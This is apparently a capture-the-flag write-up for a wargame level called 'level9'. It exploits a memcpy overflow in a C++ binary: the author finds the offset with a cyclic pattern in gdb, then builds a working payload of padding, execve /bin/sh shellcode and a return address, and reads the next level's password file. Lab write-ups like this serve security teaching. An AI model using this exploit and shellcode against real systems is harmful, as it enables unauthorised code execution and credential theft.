# level9

main() 
This binary is written in cpp and there is no calls to /bin/sh, we'll have to use shellcode this time.
We should use the memcpy() on argv[1] in setAnnotation() to make the call to edx and run the shellcode.

## analysis
Lets check the offset for buffer overflow.

    $ gdb ./level9
    run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    info register  
    eax            0x41366441	1094083649
    [...]

41366441 -> A6dA

    $ echo 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5' | wc -c
    
> returns 109 including /0 so char count is 108 this is our offset

I want to find the address where it segfaults, so I gdb to segfault with 109 chars

    (gdb) r $(python -c 'print "A" * 109')
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y

    Starting program: /home/user/level9/level9 $(python -c 'print "A" * 109')

    Program received signal SIGSEGV, Segmentation fault.
    0x54000000 in ?? ()
    (gdb) i r
    eax            0x804a078	134520952

## Final steps

The final exploit is:

pad -> 87 bytes
shellcode -> 21 bytes
address of segfault -> 0x804a078

    $ ./level9 `python -c 'print "A"*87 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x78\xa0\x04\x08"'`
    $ cat /home/user/bonus0/.pass
    f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


shell code:
http://shell-storm.org/shellcode/files/shellcode-575.html

"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

